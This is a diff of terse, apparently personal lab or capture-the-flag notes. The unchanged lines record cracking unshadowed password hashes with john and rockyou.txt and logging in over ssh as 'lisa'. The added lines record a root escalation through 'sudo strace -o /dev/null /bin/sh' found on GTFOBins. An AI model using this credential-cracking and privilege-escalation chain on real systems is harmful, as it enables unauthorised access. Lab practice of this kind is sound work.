@@ -17,6 +17,10 @@ unshadow passwd.txt shadow.txt > unshadowed.txt
 used john with rockyou.txt for cracking hashes
 got password of lisa
 ssh with lisa credentials
+sudo -l
+strace gtfobins 
+sudo strace -o /dev/null /bin/sh
+got root
 
 
 
